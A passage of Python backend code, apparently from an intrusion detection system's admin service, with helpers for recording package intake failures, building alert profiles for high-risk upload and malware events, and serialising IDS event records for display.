    intake: IDSSourcePackageIntake,
    *,
    detail: str,
    triggered_by: str,
    db: Session,
):
    intake.intake_result = PACKAGE_RESULT_FAILED
    intake.intake_detail = detail[:1000]
    intake.triggered_by = triggered_by or intake.triggered_by or ""
    db.commit()
    db.refresh(intake)


def _build_activation_failure_detail(reason: str, *, activation_note: str = "") -> str:
    if activation_note:
        return f"{reason} Operator note: {activation_note}"
    return reason


def _append_operator_note(detail: str, *, note: str = "") -> str:
    detail = (detail or "").strip()
    note = (note or "").strip()
    if not note:
        return detail[:1000]
    if not detail:
        return f"Operator note: {note}"[:1000]
    return f"{detail} Operator note: {note}"[:1000]


def _refresh_runtime_cache_safely(*, reason: str, source_key: str = "") -> None:
    try:
        refresh_runtime_rule_cache()
    except Exception as exc:
        logger.warning(
            "IDS runtime cache refresh failed after %s for %s: %s",
            reason,
            source_key or "-",
            exc,
        )


def _summarize_sources(items: list[dict]) -> dict:
    healthy_count = sum(1 for item in items if item.get("health_state") == HEALTH_HEALTHY)
    degraded_count = sum(1 for item in items if item.get("health_state") != HEALTH_HEALTHY)
    trusted_count = sum(1 for item in items if item.get("is_production_trusted"))
    demo_test_count = sum(1 for item in items if not item.get("is_production_trusted"))
    return {
        "total": len(items),
        "healthy_count": healthy_count,
        "degraded_count": degraded_count,
        "trusted_count": trusted_count,
        "demo_test_count": demo_test_count,
    }


def _build_ids_alert_profile(row: IDSEvent, upload_trace: dict[str, Any] | None) -> dict[str, Any]:
    risk_score = int(row.risk_score or 0)
    attack_type = str(row.attack_type or "").strip().lower()
    response_result = str(row.response_result or "").strip().lower()
    is_upload_related = bool(upload_trace) or (row.path or "") in {"/api/upload", _SAMPLE_SUBMIT_EVENT_PATH} or (
        row.detector_name or ""
    ) in {"upload_ai_gate", "upload_audit_gate"}
    upload_audit = upload_trace.get("audit") if isinstance(upload_trace, dict) else {}
    upload_summary = (
        str(
            (upload_trace or {}).get("decision_basis", {}).get("hold_reason_summary")
            or upload_audit.get("summary")
            or row.response_detail
            or row.review_note
            or ""
        ).strip()
    )[:255]

    if is_upload_related and (response_result == "quarantine" or risk_score >= 80 or attack_type == "malware"):
        return {
            "tier": "critical_popup",
            "channel": "modal",
            "sound": "loop",
            "category": "upload",
            "title": "高危样本送检预警",
            "summary": upload_summary or "检测到新的高危样本送检事件，请立即复核。",
        }

    if attack_type == "malware" and risk_score >= 80:
        return {
            "tier": "critical_popup",
            "channel": "modal",
            "sound": "loop",
            "category": "request",
            "title": "高危 IDS 风险预警",
            "summary": str(
                row.response_detail or row.review_note or "检测到新的高危安全事件，请立即复核。"
            ).strip()[:255],
        }

    return {
        "tier": "standard_notice",
        "channel": "notification",
        "sound": "none",
        "category": "upload" if is_upload_related else "request",
        "title": "IDS 风险预警",
        "summary": str(
            row.response_detail or row.review_note or "检测到新的 IDS 攻击事件，请前往 IDS 复核。"
        ).strip()[:255],
    }


def _serialize_ids_event(row: IDSEvent, *, detail: bool = False) -> dict:
    upload_trace = _extract_upload_trace(row)
    hits = _extract_event_hits(row) if detail else []
    packet = _build_request_packet(row) if detail else None
    decision_basis = _decision_basis(row, hits) if detail else None
    ai_meta = _ai_status(row) if detail else None
    alert_profile = _build_ids_alert_profile(row, upload_trace)
    payload = {
        "id": row.id,
        "client_ip": row.client_ip,
        "event_origin": row.event_origin or REAL_EVENT_ORIGIN,
        "event_origin_label": _event_origin_label(row.event_origin),
        "source_classification": row.source_classification or "",
        "detector_family": row.detector_family or "",
        "detector_name": row.detector_name or "",
        "source_rule_id": row.source_rule_id or "",
        "source_rule_name": row.source_rule_name or "",
        "source_version": row.source_version or "",
        "source_freshness": row.source_freshness or "",
        "event_fingerprint": row.event_fingerprint or "",
        "correlation_key": row.correlation_key or "",
        "counted_in_real_metrics": (row.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "attack_type": row.attack_type,
        "attack_type_label": _attack_type_label(row.attack_type),
        "signature_matched": row.signature_matched,
        "method": row.method,
        "path": row.path,
        "query_snippet": (row.query_snippet or "")[:200],
        "body_snippet": (row.body_snippet or "")[:200],
        "user_agent": (row.user_agent or "")[:200],
        "headers_snippet": (row.headers_snippet or "")[:1000] if detail else "",
        "blocked": row.blocked,
        "firewall_rule": row.firewall_rule or "",
        "archived": row.archived,
        "status": row.status or "new",
        "review_note": (row.review_note or "")[:500],
        "action_taken": row.action_taken or "",
        "response_result": row.response_result or "",
        "response_detail": (row.response_detail or "")[:1000],
        "upload_trace": upload_trace,
        "alert_profile": alert_profile,
        "risk_score": int(row.risk_score or 0),
        "confidence": int(row.confidence or 0),
        "hit_count": int(row.hit_count or 0),
        "created_at": row.created_at.strftime("%Y-%m-%d %H:%M:%S") if row.created_at else None,
        "ai_risk_level": row.ai_risk_level or "",
        "ai_analysis": (row.ai_analysis or "")[:2000],
        "ai_confidence": int(row.ai_confidence or 0),
        "ai_analyzed_at": row.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if row.ai_analyzed_at else None,
    }
    if detail:
        payload["matched_hits"] = hits
        payload["request_packet"] = packet
        payload["packet_preview"] = (packet or {}).get("raw_request") or ""
        payload["decision_basis"] = decision_basis
        payload["ai_status"] = ai_meta
    return payload
